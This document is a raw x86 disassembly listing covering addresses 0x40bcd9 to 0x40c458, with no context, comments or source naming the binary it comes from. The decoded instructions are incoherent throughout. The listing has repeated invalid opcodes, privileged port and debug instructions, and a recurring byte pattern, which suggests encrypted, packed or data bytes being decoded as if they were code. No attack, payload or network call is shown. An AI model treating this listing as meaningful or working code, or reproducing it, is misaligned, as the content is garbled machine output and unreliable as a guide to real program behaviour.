  40bcd9:	add    eax,0x43624062
  40bcde:	inc    ecx
  40bcdf:	inc    eax
  40bce0:	inc    eax
  40bce1:	inc    eax
  40bce2:	add    eax,0x40624340
  40bce7:	add    eax,0x40664140
  40bcec:	repnz xor BYTE PTR [edi+0x3c],ah
  40bcf0:	add    BYTE PTR [ecx],dl
  40bcf2:	rol    DWORD PTR [ebx+0xd],1
  40bcf5:	mov    edi,0x87464d6
  40bcfa:	dec    ebp
  40bcfb:	or     cl,BYTE PTR [edi-0x3d]
  40bcfe:	fsub   QWORD PTR [ebx+0x63]
  40bd01:	push   ebx
  40bd02:	fdiv   QWORD PTR [esi+0x3862a8ef]
  40bd08:	je     0x40bd12
  40bd0a:	(bad)  
  40bd0b:	out    dx,eax
  40bd0c:	stc    
  40bd0d:	adc    BYTE PTR [eax],bh
  40bd0f:	inc    ebx
  40bd10:	add    BYTE PTR ds:0x41107840,al
  40bd16:	bound  eax,QWORD PTR [eax+0x40]
  40bd19:	sldt   WORD PTR [eax-0x34]
  40bd1d:	js     0x40bd81
  40bd1f:	add    eax,0x40664143
  40bd24:	inc    ebx
  40bd25:	add    BYTE PTR [ecx+0x5],al
  40bd28:	js     0x40bd6a
  40bd2a:	bound  eax,QWORD PTR [eax+0x0]
  40bd2d:	inc    eax
  40bd2e:	gs inc esi
  40bd30:	pop    edi
  40bd31:	inc    eax
  40bd32:	dec    edx
  40bd33:	lock mov esp,0xb7734d9d
  40bd39:	jge    0x40bd96
  40bd3b:	lock add eax,0x8a92828
  40bd41:	inc    ecx
  40bd42:	or     al,0xfa
  40bd44:	int    0xd0
  40bd46:	stc    
  40bd47:	jae    0x40bda8
  40bd49:	neg    DWORD PTR [eax+0x7ca34466]
  40bd4f:	mov    WORD PTR [eax],cs
  40bd51:	icebp  
  40bd52:	dec    ebp
  40bd53:	out    dx,al
  40bd54:	dec    ebx
  40bd55:	test   al,0x62
  40bd57:	jae    0x40bdb8
  40bd59:	cmp    BYTE PTR [ebx+0x15],ch
  40bd5c:	pushf  
  40bd5d:	adc    al,BYTE PTR [ecx-0x11]
  40bd60:	or     BYTE PTR [ecx+0x43],al
  40bd63:	inc    eax
  40bd64:	inc    eax
  40bd65:	add    eax,0x434162
  40bd6a:	inc    eax
  40bd6b:	add    BYTE PTR [edx+0x5],ah
  40bd6e:	inc    eax
  40bd6f:	adc    BYTE PTR [edx+0x40],ah
  40bd72:	inc    ebx
  40bd73:	inc    ecx
  40bd74:	add    eax,0x4340
  40bd79:	add    eax,0x404162
  40bd7e:	add    BYTE PTR [eax+0x43],al
  40bd81:	inc    eax
  40bd82:	add    eax,0x4a4f9a92
  40bd87:	inc    ecx
  40bd88:	sbb    BYTE PTR [ebx+0x5f],dh
  40bd8b:	and    al,0x8
  40bd8d:	out    dx,al
  40bd8e:	les    ecx,FWORD PTR [ebx+0x69]
  40bd91:	ror    BYTE PTR [eax+0x49],cl
  40bd94:	repnz cli 
  40bd96:	add    eax,0x1f73e224
  40bd9b:	push   edx
  40bd9c:	jbe    0x40bd8a
  40bd9e:	xchg   ebp,edx
  40bda0:	cmp    al,0x35
  40bda2:	dec    eax
  40bda3:	jl     0x40bdb0
  40bda5:	or     eax,0x734b5a48
  40bdaa:	lahf   
  40bdab:	push   esp
  40bdac:	jg     0x40bdfa
  40bdae:	dec    ebx
  40bdaf:	mov    cl,0xe0
  40bdb1:	sbb    BYTE PTR [eax],cl
  40bdb3:	mov    ebp,0x40dfc3f5
  40bdb8:	add    BYTE PTR [eax],al
  40bdba:	inc    ecx
  40bdbb:	inc    ebx
  40bdbc:	add    eax,0x41784062
  40bdc1:	inc    eax
  40bdc2:	inc    eax
  40bdc3:	add    BYTE PTR [edi],cl
  40bdc5:	bound  eax,QWORD PTR [ebx+0x0]
  40bdc8:	add    eax,0x25006240
  40bdcd:	inc    eax
  40bdce:	add    eax,0x40254143
  40bdd3:	add    eax,0x58620000
  40bdd8:	loop   0x40be4d
  40bdda:	pop    edi
  40bddb:	push   esi
  40bddc:	inc    esi
  40bddd:	jb     0x40be20
  40bddf:	sub    dh,BYTE PTR [ebx]
  40bde1:	jnp    0x40be03
  40bde3:	push   ecx
  40bde4:	popf   
  40bde5:	stc    
  40bde6:	enter  0x3945,0x73
  40bdea:	jae    0x40be30
  40bdec:	out    0xea,al
  40bdee:	inc    ebx
  40bdef:	add    BYTE PTR [eax],al
  40bdf1:	add    BYTE PTR [ecx+0x40],al
  40bdf4:	bound  esp,QWORD PTR [esi+0x0]
  40bdf7:	inc    eax
  40bdf8:	add    eax,0x5400000
  40bdfd:	inc    ecx
  40bdfe:	inc    eax
  40bdff:	inc    eax
  40be00:	bound  esp,QWORD PTR ds:0x25050043
  40be06:	inc    ecx
  40be07:	inc    ebx
  40be08:	inc    eax
  40be09:	test   BYTE PTR [eax+0x0],al
  40be0c:	bound  ebx,QWORD PTR [eax+0x62]
  40be0f:	inc    ecx
  40be10:	inc    eax
  40be11:	imul   ebp,DWORD PTR [esi-0x48a8a190],0xa1b4f6fc
  40be1b:	push   eax
  40be1c:	jae    0x40be0f
  40be1e:	inc    eax
  40be1f:	pop    ss
  40be20:	out    0x5,eax
  40be22:	xchg   ecx,eax
  40be23:	bound  eax,QWORD PTR [ecx-0x41]
  40be26:	push   esp
  40be27:	daa    
  40be28:	retfw  
  40be2a:	adc    BYTE PTR [edx+0x40],ah
  40be2d:	inc    ecx
  40be2e:	and    eax,0x40000500
  40be33:	inc    ebx
  40be34:	add    eax,0x40624041
  40be39:	inc    ebx
  40be3a:	add    eax,0x43402541
  40be3f:	bound  eax,QWORD PTR [eax+0x43]
  40be42:	int3   
  40be43:	inc    eax
  40be44:	bound  eax,QWORD PTR [eax]
  40be46:	inc    ecx
  40be47:	inc    eax
  40be48:	inc    eax
  40be49:	add    eax,0x724a4205
  40be4e:	pop    eax
  40be4f:	out    dx,eax
  40be50:	xchg   ecx,eax
  40be51:	call   0xa515b89a
  40be56:	jno    0x40bec8
  40be58:	sti    
  40be59:	test   BYTE PTR [ecx+0x44],0x3
  40be5d:	jb     0x40beb9
  40be5f:	inc    eax
  40be60:	daa    
  40be61:	in     eax,0x5b
  40be63:	add    ah,BYTE PTR [ecx]
  40be65:	xchg   DWORD PTR [ebp+0x50],esi
  40be68:	mov    cl,0x66
  40be6a:	les    esp,FWORD PTR [edx+0x40]
  40be6d:	and    eax,0x5406600
  40be72:	inc    ebx
  40be73:	inc    ecx
  40be74:	inc    eax
  40be75:	inc    eax
  40be76:	inc    ebx
  40be77:	add    BYTE PTR [eax],al
  40be79:	add    BYTE PTR [edx-0x34],ah
  40be7c:	inc    eax
  40be7d:	add    eax,0x40004041
  40be82:	inc    ecx
  40be83:	int3   
  40be84:	add    BYTE PTR [ebx-0x7c],al
  40be87:	add    eax,0x5406240
  40be8c:	bound  eax,QWORD PTR [eax+0x71]
  40be8f:	jb     0x40becb
  40be91:	js     0x40bea2
  40be93:	out    0x61,al
  40be95:	push   ss
  40be96:	mov    ds:0x9f447fea,al
  40be9b:	pop    esp
  40be9c:	test   al,0x6b
  40be9e:	arpl   WORD PTR [edx+0x8],si
  40bea1:	stc    
  40bea2:	mov    dl,0xa9
  40bea4:	adc    ah,BYTE PTR [ecx+0x45dfcd42]
  40beaa:	adc    ah,ah
  40beac:	mov    esp,0x58624081
  40beb1:	inc    ecx
  40beb2:	add    eax,0x40404340
  40beb7:	inc    ebx
  40beb8:	inc    eax
  40beb9:	test   BYTE PTR [eax],al
  40bebb:	add    eax,0x40624041
  40bec0:	inc    eax
  40bec1:	add    BYTE PTR [edx+0x5],ah
  40bec4:	inc    ebx
  40bec5:	add    BYTE PTR [eax+0x78],al
  40bec8:	inc    ecx
  40bec9:	add    BYTE PTR [eax+0x41],bl
  40becc:	bound  ebp,QWORD PTR [edx]
  40bece:	jb     0x40bed8
  40bed0:	fdivr  DWORD PTR [eax+0xb]
  40bed3:	adc    eax,0xdf304142
  40bed8:	jno    0x40be72
  40beda:	mov    cl,0xcb
  40bedc:	mul    BYTE PTR [edx]
  40bede:	jb     0x40bf5f
  40bee0:	dec    ecx
  40bee1:	add    BYTE PTR [eax-0x4c],0x40
  40bee5:	test   BYTE PTR [eax],al
  40bee7:	int3   
  40bee8:	bound  eax,QWORD PTR ds:0xcc840f41
  40beee:	inc    ebx
  40beef:	add    BYTE PTR [eax+0x0],al
  40bef2:	inc    eax
  40bef3:	inc    eax
  40bef4:	inc    eax
  40bef5:	int3   
  40bef6:	add    BYTE PTR ds:0x62404341,al
  40befc:	pop    eax
  40befd:	add    BYTE PTR [ebx+0x40],al
  40bf00:	bound  ecx,QWORD PTR [edi]
  40bf02:	inc    eax
  40bf03:	dec    edi
  40bf04:	push   0x84d1ff13
  40bf09:	inc    eax
  40bf0a:	add    eax,0x87213c4
  40bf0f:	jp     0x40bef2
  40bf11:	inc    eax
  40bf12:	leave  
  40bf13:	lock inc ecx
  40bf15:	jbe    0x40bef6
  40bf17:	icebp  
  40bf18:	xchg   ecx,eax
  40bf19:	dec    esp
  40bf1a:	dec    esp
  40bf1b:	dec    ebp
  40bf1c:	and    DWORD PTR [edx+0x7f],esi
  40bf1f:	sbb    eax,DWORD PTR [eax]
  40bf21:	add    BYTE PTR [eax+0x40],al
  40bf24:	cmovno eax,DWORD PTR ds:0x40056243
  40bf2b:	int3   
  40bf2c:	add    ah,cl
  40bf2e:	inc    eax
  40bf2f:	inc    eax
  40bf30:	bound  eax,QWORD PTR [ecx+0x0]
  40bf33:	add    BYTE PTR [edi],cl
  40bf35:	inc    ebx
  40bf36:	inc    eax
  40bf37:	inc    eax
  40bf38:	add    BYTE PTR [ecx+0x43],al
  40bf3b:	add    eax,0x40256240
  40bf40:	bound  eax,QWORD PTR [eax]
  40bf42:	rol    DWORD PTR [ecx+0x47],cl
  40bf45:	adc    al,0x6a
  40bf47:	pop    ecx
  40bf48:	jg     0x40bf93
  40bf4a:	ds lock inc edx
  40bf4d:	leave  
  40bf4e:	(bad)  
  40bf4f:	jno    0x40bf10
  40bf51:	icebp  
  40bf52:	xchg   esi,eax
  40bf53:	int3   
  40bf54:	cmp    al,0xec
  40bf56:	pushf  
  40bf57:	mov    esp,0x62965e66
  40bf5c:	aam    0x4d
  40bf5e:	dec    eax
  40bf5f:	jno    0x40bf3e
  40bf61:	icebp  
  40bf62:	jecxz  0x40bf29
  40bf64:	mov    al,ds:0x709f1304
  40bf69:	jnp    0x40bf13
  40bf6b:	xchg   DWORD PTR [edx-0x37],eax
  40bf6e:	fnsave [ecx-0x67]
  40bf71:	adc    DWORD PTR [eax],esp
  40bf73:	loop   0x40bfb3
  40bf75:	inc    eax
  40bf76:	dec    edx
  40bf77:	add    BYTE PTR ds:0x4140cc00,0x40
  40bf7e:	inc    ebx
  40bf7f:	bound  esp,QWORD PTR ds:0x41400043
  40bf85:	add    BYTE PTR [eax],al
  40bf87:	add    eax,0x43624062
  40bf8c:	inc    ecx
  40bf8d:	inc    eax
  40bf8e:	inc    eax
  40bf8f:	inc    eax
  40bf90:	add    eax,0x40624340
  40bf95:	add    eax,0x40664140
  40bf9a:	jo     0x40bfe8
  40bf9c:	lock or cl,bl
  40bf9f:	mov    eax,esi
  40bfa1:	jno    0x40bf42
  40bfa3:	adc    ecx,esi
  40bfa5:	retf   
  40bfa6:	adc    BYTE PTR [edi+0x21],al
  40bfa9:	in     eax,0x70
  40bfab:	push   eax
  40bfac:	xchg   ebp,eax
  40bfad:	loopne 0x40bf67
  40bfaf:	or     esp,DWORD PTR [ecx+esi*2+0xd57919f]
  40bfb6:	add    eax,0x500433c
  40bfbb:	inc    eax
  40bfbc:	js     0x40bfce
  40bfbe:	inc    ecx
  40bfbf:	bound  eax,QWORD PTR [eax+0x40]
  40bfc2:	sldt   WORD PTR [eax-0x34]
  40bfc6:	js     0x40c02a
  40bfc8:	add    eax,0x40664143
  40bfcd:	inc    ebx
  40bfce:	add    BYTE PTR [ecx+0x5],al
  40bfd1:	js     0x40c013
  40bfd3:	bound  eax,QWORD PTR [eax+0x0]
  40bfd6:	inc    eax
  40bfd7:	push   0xffffffc8
  40bfd9:	pop    esi
  40bfda:	dec    esp
  40bfdb:	test   DWORD PTR [ebx],0x714364cb
  40bfe1:	jne    0x40c05e
  40bfe3:	(bad)  
  40bfe4:	out    dx,al
  40bfe5:	adc    bl,cl
  40bfe7:	shr    BYTE PTR [ebx],1
  40bfe9:	inc    ebp
  40bfea:	adc    al,0x3
  40bfec:	stc    
  40bfed:	dec    eax
  40bfee:	dec    eax
  40bfef:	loope  0x40c062
  40bff1:	push   edx
  40bff2:	icebp  
  40bff3:	into   
  40bff4:	ficom  WORD PTR ds:0x2f0e2705
  40bffa:	inc    esi
  40bffb:	inc    BYTE PTR [esi-0x35]
  40bffe:	retf   
  40bfff:	inc    ecx
  40c000:	inc    ebx
  40c001:	inc    eax
  40c002:	inc    eax
  40c003:	add    eax,0x434162
  40c008:	inc    eax
  40c009:	add    BYTE PTR [edx+0x5],ah
  40c00c:	inc    eax
  40c00d:	adc    BYTE PTR [edx+0x40],ah
  40c010:	inc    ebx
  40c011:	inc    ecx
  40c012:	add    eax,0x4340
  40c017:	add    eax,0x404162
  40c01c:	add    BYTE PTR [eax+0x43],al
  40c01f:	inc    eax
  40c020:	add    eax,0x5152718d
  40c025:	scas   eax,DWORD PTR es:[edi]
  40c026:	mov    dh,0x63
  40c028:	inc    ecx
  40c029:	fs jno 0x40c01f
  40c02c:	mov    edi,0x6047dcb9
  40c031:	mov    ebx,0xb94cbd71
  40c036:	adc    eax,0x54c75c56
  40c03b:	dec    ecx
  40c03c:	sbb    ecx,edi
  40c03e:	loopne 0x40bfe8
  40c040:	(bad)  
  40c042:	jo     0x40c055
  40c044:	inc    ebx
  40c045:	lahf   
  40c046:	jmp    0x9b56:0xb7484fb7
  40c04d:	das    
  40c04e:	gs clc 
  40c050:	inc    eax
  40c051:	add    BYTE PTR [eax],al
  40c053:	inc    ecx
  40c054:	inc    ebx
  40c055:	add    eax,0x41784062
  40c05a:	inc    eax
  40c05b:	inc    eax
  40c05c:	add    BYTE PTR [edi],cl
  40c05e:	bound  eax,QWORD PTR [ebx+0x0]
  40c061:	add    eax,0x25006240
  40c066:	inc    eax
  40c067:	add    eax,0x40254143
  40c06c:	add    eax,0x28620000
  40c071:	inc    edx
  40c072:	jo     0x40c00d
  40c074:	inc    ecx
  40c075:	daa    
  40c076:	fisubr DWORD PTR [eax+0x479a317d]
  40c07c:	aad    0x9d
  40c07e:	or     eax,0x7002a811
  40c083:	xchg   ecx,eax
  40c084:	je     0x40c090
  40c086:	dec    esp
  40c087:	mov    esp,0x43fd4710
  40c08c:	add    BYTE PTR [eax],al
  40c08e:	add    BYTE PTR [ecx+0x40],al
  40c091:	bound  esp,QWORD PTR [esi+0x0]
  40c094:	inc    eax
  40c095:	add    eax,0x5400000
  40c09a:	inc    ecx
  40c09b:	inc    eax
  40c09c:	inc    eax
  40c09d:	bound  esp,QWORD PTR ds:0x25050043
  40c0a3:	inc    ecx
  40c0a4:	inc    ebx
  40c0a5:	inc    eax
  40c0a6:	test   BYTE PTR [eax+0x0],al
  40c0a9:	bound  ebx,QWORD PTR [eax+0x62]
  40c0ac:	inc    ecx
  40c0ad:	inc    eax
  40c0ae:	inc    esp
  40c0af:	xor    BYTE PTR [edx+ebp*8+0x70a8880d],cl
  40c0b6:	push   edx
  40c0b7:	jp     0x40c109
  40c0b9:	stc    
  40c0ba:	int    0x8f
  40c0bc:	add    al,ah
  40c0be:	and    ebx,DWORD PTR [esi-0x66]
  40c0c1:	fcom   DWORD PTR [eax]
  40c0c3:	push   edx
  40c0c4:	cmp    esi,DWORD PTR [eax+0x10]
  40c0c7:	bound  eax,QWORD PTR [eax+0x41]
  40c0ca:	and    eax,0x40000500
  40c0cf:	inc    ebx
  40c0d0:	add    eax,0x40624041
  40c0d5:	inc    ebx
  40c0d6:	add    eax,0x43402541
  40c0db:	bound  eax,QWORD PTR [eax+0x43]
  40c0de:	int3   
  40c0df:	inc    eax
  40c0e0:	bound  eax,QWORD PTR [eax]
  40c0e2:	inc    ecx
  40c0e3:	inc    eax
  40c0e4:	inc    eax
  40c0e5:	add    eax,0x3ab36e05
  40c0ea:	add    eax,0xc36342b8
  40c0ef:	mov    dl,0x71
  40c0f1:	sbb    cl,BYTE PTR [edi+0x5]
  40c0f4:	loopne 0x40c0f7
  40c0f6:	jo     0x40c12b
  40c0f8:	xchg   ecx,eax
  40c0f9:	leave  
  40c0fa:	ret    
  40c0fb:	int    0x62
  40c0fd:	inc    eax
  40c0fe:	and    eax,0x5406600
  40c103:	inc    ebx
  40c104:	inc    ecx
  40c105:	inc    eax
  40c106:	inc    eax
  40c107:	inc    ebx
  40c108:	add    BYTE PTR [eax],al
  40c10a:	add    BYTE PTR [edx-0x34],ah
  40c10d:	inc    eax
  40c10e:	add    eax,0x40004041
  40c113:	inc    ecx
  40c114:	int3   
  40c115:	add    BYTE PTR [ebx-0x7c],al
  40c118:	add    eax,0x5406240
  40c11d:	bound  esp,QWORD PTR [edi-0x63]
  40c120:	rcr    BYTE PTR es:[edi-0x6d],1
  40c124:	and    cl,BYTE PTR [eax+0x9]
  40c127:	hlt    
  40c128:	jo     0x40c0e1
  40c12a:	xor    DWORD PTR [ebx-0x8],ebp
  40c12d:	inc    eax
  40c12e:	xchg   esp,eax
  40c12f:	sub    BYTE PTR [ecx],cl
  40c131:	mov    ch,0xb7
  40c133:	mov    al,ds:0x5d8438d6
  40c138:	jo     0x40c10a
  40c13a:	inc    edx
  40c13b:	inc    eax
  40c13c:	bound  ebx,QWORD PTR [eax+0x41]
  40c13f:	add    eax,0x40404340
  40c144:	inc    ebx
  40c145:	inc    eax
  40c146:	test   BYTE PTR [eax],al
  40c148:	add    eax,0x40624041
  40c14d:	inc    eax
  40c14e:	add    BYTE PTR [edx+0x5],ah
  40c151:	inc    ebx
  40c152:	add    BYTE PTR [eax+0x78],al
  40c155:	inc    ecx
  40c156:	add    BYTE PTR [eax+0x41],bl
  40c159:	bound  edi,QWORD PTR [esi+0x342cb8a3]
  40c15f:	ins    BYTE PTR es:[edi],dx
  40c160:	mov    edi,0x40379471
  40c165:	push   ebp
  40c166:	xor    BYTE PTR [eax+0x5f],0x2c
  40c16a:	pop    ebx
  40c16b:	data16 stc 
  40c16d:	fadd   st(5),st
  40c16f:	dec    edi
  40c170:	mov    bl,0x50
  40c172:	ss aam 0xbc
  40c175:	inc    eax
  40c176:	inc    ebp
  40c177:	inc    eax
  40c178:	pop    esi
  40c179:	xor    BYTE PTR [esi],ch
  40c17b:	or     eax,0x40492c05
  40c180:	jge    0x40c18a
  40c182:	sub    ecx,DWORD PTR [eax+0x41d8af87]
  40c188:	push   ebx
  40c189:	xor    BYTE PTR [esi-0x36],al
  40c18c:	jbe    0x40c1ce
  40c18e:	test   BYTE PTR [eax],al
  40c190:	int3   
  40c191:	bound  eax,QWORD PTR ds:0xcc840f41
  40c197:	inc    ebx
  40c198:	add    BYTE PTR [eax+0x0],al
  40c19b:	inc    eax
  40c19c:	inc    eax
  40c19d:	inc    eax
  40c19e:	int3   
  40c19f:	add    BYTE PTR ds:0x62404341,al
  40c1a5:	pop    eax
  40c1a6:	add    BYTE PTR [ebx+0x40],al
  40c1a9:	bound  ecx,QWORD PTR [edi]
  40c1ab:	inc    eax
  40c1ac:	sub    al,0xc5
  40c1ae:	dec    eax
  40c1af:	lahf   
  40c1b0:	jp     0x40c159
  40c1b2:	and    ecx,DWORD PTR fs:[ecx-0x14]
  40c1b6:	inc    eax
  40c1b7:	into   
  40c1b8:	push   esp
  40c1b9:	pop    ecx
  40c1ba:	stc    
  40c1bb:	mov    ah,0x1c
  40c1bd:	popf   
  40c1be:	inc    eax
  40c1bf:	pop    ebx
  40c1c0:	jb     0x40c1ee
  40c1c2:	rol    BYTE PTR ds:0xce602668,cl
  40c1c8:	and    al,0x76
  40c1ca:	inc    ebx
  40c1cb:	xchg   DWORD PTR [esi+0x7b],edi
  40c1ce:	inc    eax
  40c1cf:	pop    edi
  40c1d0:	cmp    eax,0xc84caa31
  40c1d5:	mov    esp,0xc0310640
  40c1da:	shr    BYTE PTR [edx+eiz*2-0x6acebf98],1
  40c1e1:	and    eax,0xc343
  40c1e6:	inc    eax
  40c1e7:	inc    eax
  40c1e8:	cmovno eax,DWORD PTR ds:0x40056243
  40c1ef:	int3   
  40c1f0:	add    ah,cl
  40c1f2:	inc    eax
  40c1f3:	inc    eax
  40c1f4:	bound  eax,QWORD PTR [ecx+0x0]
  40c1f7:	add    BYTE PTR [edi],cl
  40c1f9:	inc    ebx
  40c1fa:	inc    eax
  40c1fb:	inc    eax
  40c1fc:	add    BYTE PTR [ecx+0x43],al
  40c1ff:	add    eax,0x40256240
  40c204:	bound  eax,QWORD PTR [eax]
  40c206:	inc    ebp
  40c207:	mov    esp,0x2742547f
  40c20c:	test   eax,0xb26284ac
  40c211:	mov    ch,0x3f
  40c213:	mov    ecx,esi
  40c215:	retf   
  40c216:	inc    edi
  40c217:	inc    eax
  40c218:	jg     0x40c1d9
  40c21a:	push   esi
  40c21b:	mov    bh,0xf9
  40c21d:	adc    eax,0xf954036
  40c222:	xchg   ecx,eax
  40c223:	and    cl,BYTE PTR ds:0x7f694546
  40c229:	adc    al,0x2d
  40c22b:	pop    ss
  40c22c:	inc    ax
  40c22e:	add    cl,BYTE PTR [eax+edi*8-0x33e28bd7]
  40c235:	inc    eax
  40c236:	stos   DWORD PTR es:[edi],eax
  40c237:	outs   dx,BYTE PTR ds:[esi]
  40c238:	jg     0x40c2ae
  40c23a:	jp     0x40c265
  40c23c:	mul    BYTE PTR [edi+0x7c]
  40c23f:	int    0xdb
  40c241:	add    eax,0x4140cc00
  40c246:	inc    eax
  40c247:	inc    ebx
  40c248:	bound  esp,QWORD PTR ds:0x41400043
  40c24e:	add    BYTE PTR [eax],al
  40c250:	add    eax,0x43624062
  40c255:	inc    ecx
  40c256:	inc    eax
  40c257:	inc    eax
  40c258:	inc    eax
  40c259:	add    eax,0x40624340
  40c25e:	add    eax,0x40664140
  40c263:	xchg   ecx,eax
  40c264:	inc    edi
  40c265:	inc    esi
  40c266:	cmp    DWORD PTR [esi+edx*2+0x37727f63],ecx
  40c26d:	and    BYTE PTR [esi-0x7d],0xa8
  40c271:	test   al,0x3e
  40c273:	cmc    
  40c274:	add    DWORD PTR [esi+0x5b41dca],edi
  40c27a:	jg     0x40c2cf
  40c27c:	xchg   ecx,eax
  40c27d:	pop    esi
  40c27e:	add    BYTE PTR [ebp+0x39214105],ah
  40c284:	push   ebp
  40c285:	inc    ecx
  40c286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c287:	retf   
  40c288:	leave  
  40c289:	mov    ?,WORD PTR [edi+0x10]
  40c28c:	push   ecx
  40c28d:	mov    dl,0xc8
  40c28f:	nop
  40c290:	inc    ebx
  40c291:	pop    es
  40c292:	add    al,0x9f
  40c294:	inc    esp
  40c295:	sub    dh,dh
  40c297:	inc    ebx
  40c298:	add    BYTE PTR ds:0x41107840,al
  40c29e:	bound  eax,QWORD PTR [eax+0x40]
  40c2a1:	sldt   WORD PTR [eax-0x34]
  40c2a5:	js     0x40c309
  40c2a7:	add    eax,0x40664143
  40c2ac:	inc    ebx
  40c2ad:	add    BYTE PTR [ecx+0x5],al
  40c2b0:	js     0x40c2f2
  40c2b2:	bound  eax,QWORD PTR [eax+0x0]
  40c2b5:	inc    eax
  40c2b6:	add    eax,0xc17f76e2
  40c2bb:	xchg   edx,eax
  40c2bc:	(bad)  
  40c2bd:	dec    ebp
  40c2be:	inc    esp
  40c2bf:	(bad)  
  40c2c0:	cmc    
  40c2c1:	addr16 mov bl,0xaf
  40c2c4:	dec    eax
  40c2c5:	imul   dx,WORD PTR [edx+eiz*2+0x7f],0x4d
  40c2cb:	and    ah,bl
  40c2cd:	(bad)  
  40c2ce:	sub    cl,dh
  40c2d0:	inc    ecx
  40c2d1:	dec    edx
  40c2d2:	repnz inc ebx
  40c2d4:	xchg   edx,eax
  40c2d5:	dec    edx
  40c2d6:	inc    ecx
  40c2d7:	test   al,0x8c
  40c2d9:	jle    0x40c2da
  40c2db:	xor    DWORD PTR [eax+0x134090b1],esi
  40c2e1:	inc    ecx
  40c2e2:	inc    ebx
  40c2e3:	inc    eax
  40c2e4:	inc    eax
  40c2e5:	add    eax,0x434162
  40c2ea:	inc    eax
  40c2eb:	add    BYTE PTR [edx+0x5],ah
  40c2ee:	inc    eax
  40c2ef:	adc    BYTE PTR [edx+0x40],ah
  40c2f2:	inc    ebx
  40c2f3:	inc    ecx
  40c2f4:	add    eax,0x4340
  40c2f9:	add    eax,0x404162
  40c2fe:	add    BYTE PTR [eax+0x43],al
  40c301:	inc    eax
  40c302:	add    eax,0x4f4f29ad
  40c307:	les    eax,FWORD PTR ds:0x677e6c2a
  40c30d:	jno    0x40c2e2
  40c30f:	adc    eax,0x90291087
  40c314:	lock into 
  40c316:	add    al,0x7f
  40c318:	dec    eax
  40c319:	inc    edx
  40c31a:	inc    ecx
  40c31b:	jle    0x40c33e
  40c31d:	xchg   esp,eax
  40c31e:	cmp    eax,0x8c6fc9e2
  40c323:	repz sub DWORD PTR [edx+0x47],edi
  40c327:	dec    edx
  40c328:	mov    esp,0x317e1ff0
  40c32d:	mov    eax,ds:0x520d30de
  40c332:	test   al,0xd6
  40c334:	dec    esi
  40c335:	push   ebp
  40c336:	icebp  
  40c337:	dec    edi
  40c338:	retf   
  40c339:	retf   
  40c33a:	adc    BYTE PTR [esi+0x40],bh
  40c33d:	add    BYTE PTR [eax],al
  40c33f:	inc    ecx
  40c340:	inc    ebx
  40c341:	add    eax,0x41784062
  40c346:	inc    eax
  40c347:	inc    eax
  40c348:	add    BYTE PTR [edi],cl
  40c34a:	bound  eax,QWORD PTR [ebx+0x0]
  40c34d:	add    eax,0x25006240
  40c352:	inc    eax
  40c353:	add    eax,0x40254143
  40c358:	add    eax,0xd4620000
  40c35d:	inc    edx
  40c35e:	dec    edx
  40c35f:	ror    BYTE PTR [eax+ebp*2-0x60],0x39
  40c364:	and    eax,0x50540d1
  40c369:	stos   DWORD PTR es:[edi],eax
  40c36a:	add    eax,0xee385a7e
  40c36f:	xchg   ebx,ecx
  40c371:	test   eax,0xf0b41f42
  40c376:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40c378:	push   ecx
  40c379:	(bad)  
  40c37a:	dec    esi
  40c37b:	jle    0x40c389
  40c37d:	aaa    
  40c37e:	rol    DWORD PTR [edx-0x37],cl
  40c381:	dec    ecx
  40c382:	in     al,dx
  40c383:	add    eax,0x7249231a
  40c388:	mov    eax,0x4335
  40c38d:	add    BYTE PTR [ecx+0x40],al
  40c390:	bound  esp,QWORD PTR [esi+0x0]
  40c393:	inc    eax
  40c394:	add    eax,0x5400000
  40c399:	inc    ecx
  40c39a:	inc    eax
  40c39b:	inc    eax
  40c39c:	bound  esp,QWORD PTR ds:0x25050043
  40c3a2:	inc    ecx
  40c3a3:	inc    ebx
  40c3a4:	inc    eax
  40c3a5:	test   BYTE PTR [eax+0x0],al
  40c3a8:	bound  ebx,QWORD PTR [eax+0x62]
  40c3ab:	inc    ecx
  40c3ac:	inc    eax
  40c3ad:	pop    edi
  40c3ae:	jle    0x40c3f0
  40c3b0:	imul   edi,DWORD PTR [edi+0x2bf215d0],0xddf3516b
  40c3ba:	mov    ds:0x7e79decb,al
  40c3bf:	push   ecx
  40c3c0:	inc    edx
  40c3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c2:	add    eax,0x51b66948
  40c3c7:	mov    edi,0xd414ef4
  40c3cc:	xor    BYTE PTR [ebx+0x7d],ah
  40c3cf:	push   ecx
  40c3d0:	and    cl,BYTE PTR [edi+0x6009cbe2]
  40c3d6:	adc    BYTE PTR [edx+0x40],ah
  40c3d9:	inc    ecx
  40c3da:	and    eax,0x40000500
  40c3df:	inc    ebx
  40c3e0:	add    eax,0x40624041
  40c3e5:	inc    ebx
  40c3e6:	add    eax,0x43402541
  40c3eb:	bound  eax,QWORD PTR [eax+0x43]
  40c3ee:	int3   
  40c3ef:	inc    eax
  40c3f0:	bound  eax,QWORD PTR [eax]
  40c3f2:	inc    ecx
  40c3f3:	inc    eax
  40c3f4:	inc    eax
  40c3f5:	add    eax,0x7bfbb705
  40c3fa:	dec    ebx
  40c3fb:	clc    
  40c3fc:	adc    BYTE PTR [eax+0x315c7d8a],dl
  40c402:	cmp    ah,BYTE PTR [eax-0x62c69db4]
  40c408:	push   ecx
  40c409:	inc    edx
  40c40a:	sub    dl,BYTE PTR ds:0x7d09c8c9
  40c410:	or     al,0x32
  40c412:	sbb    al,BYTE PTR [ecx+0x26]
  40c415:	inc    ebp
  40c416:	cmp    al,0x83
  40c418:	cmp    BYTE PTR ds:0x6246c3e8,bh
  40c41e:	inc    eax
  40c41f:	and    eax,0x5406600
  40c424:	inc    ebx
  40c425:	inc    ecx
  40c426:	inc    eax
  40c427:	inc    eax
  40c428:	inc    ebx
  40c429:	add    BYTE PTR [eax],al
  40c42b:	add    BYTE PTR [edx-0x34],ah
  40c42e:	inc    eax
  40c42f:	add    eax,0x40004041
  40c434:	inc    ecx
  40c435:	int3   
  40c436:	add    BYTE PTR [ebx-0x7c],al
  40c439:	add    eax,0x5406240
  40c43e:	bound  esi,QWORD PTR ds:0x41097d5c
  40c444:	dec    ebp
  40c445:	outs   dx,DWORD PTR ds:[esi]
  40c446:	inc    eax
  40c447:	clc    
  40c448:	adc    ecx,ebp
  40c44a:	inc    ebp
  40c44b:	shr    BYTE PTR ds:0xc9455bfa,1
  40c451:	jge    0x40c484
  40c453:	sub    eax,0x95f49e2a
  40c458:	pushf  
